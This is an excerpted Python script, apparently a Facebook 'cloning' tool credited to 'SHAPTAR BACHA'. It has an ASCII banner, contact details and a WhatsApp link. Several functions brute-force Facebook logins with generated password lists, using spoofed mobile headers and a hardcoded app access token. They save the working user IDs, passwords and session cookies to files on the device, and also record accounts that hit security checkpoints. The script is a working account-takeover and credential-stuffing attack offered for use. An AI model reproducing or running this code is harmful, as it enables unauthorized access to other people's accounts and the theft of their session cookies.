...
os.system('xdg-open https://chat.whatsapp.com/DeVzVK58tsV0eolWV1QcVR')
...
\033[1;97m .d8888b.  888    888        d8888 8888888b. 88888888888     d8888 8888888b.  
\033[1;97md88P  Y88b 888    888       d88888 888   Y88b    888        d88888 888   Y88b 
\033[1;97mY88b.      888    888      d88P888 888    888    888       d88P888 888    888 
\033[1;97m "Y888b.   8888888888     d88P 888 888   d88P    888      d88P 888 888   d88P 
\033[1;97m    "Y88b. 888    888    d88P  888 8888888P"     888     d88P  888 8888888P"  
\033[1;97m      "888 888    888   d88P   888 888           888    d88P   888 888 T88b   
\033[1;97mY88b  d88P 888    888  d8888888888 888           888   d8888888888 888  T88b  
\033[1;97m "Y8888P"  888    888 d88P     888 888           888  d88P     888 888   T88b
                             
                               
                          \033[1;37m\033[1;42m HAMZA : SHAPTAR BACHA \033[0m\033[1;37m
\033[1;37;1m -----------------------------------------------
\033[1;97m[>] AUTHOR       : SHAPTAR BACHA
\033[1;97m[>] WHATSAPP     : +18192720340
\033[1;97m[>] FACEBOOK     : Muhammad Hamza 
...
def menu():
    try:
                ...
                x = ("***")
                if x == ("***"):
                        print('\033[92;1m[\033[1;32m1\033[92;1m]\033[1;37m FILE CLONING')
                        print('\033[92;1m[\033[1;32m2\033[92;1m]\033[1;37m RANDOM CLONING')                                                     
                        print('\033[92;1m[\033[1;32m0\033[92;1m]\033[1;37m EXIT ')
                        line()
...
def gmail():
                ...
                clear()
                print('\033[1;37m Example: hamza,zain,ali, \033[1;97m')
                line()
                first = input(' FIRST NAME : ')
                line()
                print('\033[1;37m example: ahmad,khan,baloch, \033[1;97m')
                line()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSHAPTAR_BACHA\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua=random.choice(SHAPTAR_BACHA())
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':SHAPTAR_BACHA(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\033[96;1 [SHAPTAR_BACHA-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SHAPTAR_BACHA-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SHAPTAR_BACHA-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SHAPTAR_BACHA-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHAPTAR_BACHA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api1(ids,names,passlist):
    try:
        ...
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;97mSHAPTAR_BACHA\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()  
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
    ...
    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            ...
            if 'session_key' in po:
                uid = str(po['uid'])
                print('\r\r\033[1;32m [SHAPTAR_BACHA-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
                ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookies = f"sb={ssbb};{ckkk}"
                print('\033[1;32m [🍪] COOKIES :- \033[1;92m'+cookies)                
                open('/sdcard/SHAPTAR_BACHA-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in po['error']['message']:
                uid = str(po['error']['error_data']['uid'])
                print(f'\r\r\033[1;93m [SHAPTAR_BACHA-CP] '+uid+' | '+pas+'\033[1;91m')
                open('/sdcard/SHAPTAR_BACHA-CP.txt','a').write(uid+'|'+pas+'\n')
                cps.append(uid)
                break
            else:
                continue
...
def rd(ids,passlist):
    try:
        ...
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;97mSHAPTAR_BACHA\x1b[1;92m-\x1b[1;92m🥰\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()      
        for pas in passlist:                                          
            access_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            head = {
    'User-Agent': SHAPTAR_BACHA(),  
    ...
    'access_token': access_token
            ...
            if 'session_key' in po:
                ...
                open('/sdcard/SHAPTAR_BACHA-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
                oks.append(uid)
                ...
                uid = str(po['error']['error_data']['uid'])
                print(f'\r\r\033[1;93m [SHAPTAR_BACHA-CP] '+uid+' | '+pas+'\033[1;91m')
                open('/sdcard/SHAPTAR_BACHA-R-CP.txt','a').write(uid+'|'+pas+'\n')
                cps.append(uid)
                break
            else:
                continue
...
def bd1(ids,passlist):
    ...
    try:
        for ps in passlist:            
            session = requests.Session()
            sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSHAPTAR_BACHA\x1b[1;92m-\x1b[1;92m🥰\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()              
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [SHAPTAR_BACHA-OK] '+ids+' | '+ps)                
                print('\033[1;32m [🍪] COOKIES :-\033[1;92m '+coki)                
                open('/sdcard/SHAPTAR_BACHA-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f'\r\r\033[1;93m [SHAPTAR_BACHA-CP] '+ids+' | '+ps+'\033[1;91m')
                open('/sdcard/SHAPTAR_BACHA-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mSHAPTAR_BACHA-2F '+ids+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
...
def newidx(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSHAPTAR_BACHA\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()  
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
